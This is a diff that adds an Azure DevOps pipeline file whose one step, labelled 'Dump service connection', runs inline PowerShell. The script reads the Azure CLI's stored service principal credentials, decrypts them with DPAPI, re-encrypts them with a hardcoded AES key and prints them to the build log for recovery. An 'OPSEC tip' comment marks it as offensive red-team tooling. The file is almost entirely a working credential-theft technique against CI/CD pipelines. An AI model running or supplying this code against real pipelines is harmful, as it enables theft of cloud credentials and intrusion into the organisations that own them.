@@ -1,0 +1,46 @@
+trigger:
+- main
+
+pool:
+  name: default
+
+steps:
+- task: AzureCLI@2
+  displayName: "Dump service connection"
+  inputs:
+    azureSubscription: 'az-storage-svc_connection'
+    scriptType: 'ps'
+    scriptLocation: 'inlineScript'
+    
+    # Dump Service Connection credential and encrypt the output using AES-256-CBC
+    inlineScript: '
+    Add-Type -AssemblyName System.Security; 
+
+    $AES = [System.Security.Cryptography.Aes]::Create();
+
+    <# 
+    OPSEC tip:
+    If you have the ability to configure pipeline variables,
+    store the AES key value in a secret variable 
+    #>
+    $Key = "PvhhUEgXm6l6v5aiNTM4ctBAjsZKrq4m5av6WmMNdkI=";
+    $IV = "spSGALRu5BhQxcJ9ymMBRA==";
+
+    $KeyBytes = [System.Convert]::FromBase64String($Key);
+    $IVBytes = [System.Convert]::FromBase64String($IV);
+    $aes = [System.Security.Cryptography.Aes]::Create();
+    $aes.Key = $KeyBytes;
+    $aes.IV = $IVBytes;
+    $encryptor = $aes.CreateEncryptor();
+
+    <# Use DPAPI to decrypt service_principal_entries.bin #>
+    $spnBytes = [System.IO.File]::ReadAllBytes("$env:AZURE_CONFIG_DIR\service_principal_entries.bin");
+    $spnText = [Text.Encoding]::ASCII.GetString([Security.Cryptography.ProtectedData]::Unprotect($spnBytes, $null, "CurrentUser"));
+
+    <# Encrypt the contents of service_principal_entries.bin using AES #>
+    [System.Byte[]]$Bytes =  [System.Text.Encoding]::Unicode.GetBytes($spnText);
+    $EncryptedBytes = $encryptor.TransformFinalBlock($Bytes,0,$bytes.Length);
+
+    <# Base64 encode the encrypted service principal credential #>
+    [System.Convert]::ToBase64String($EncryptedBytes);
+    '
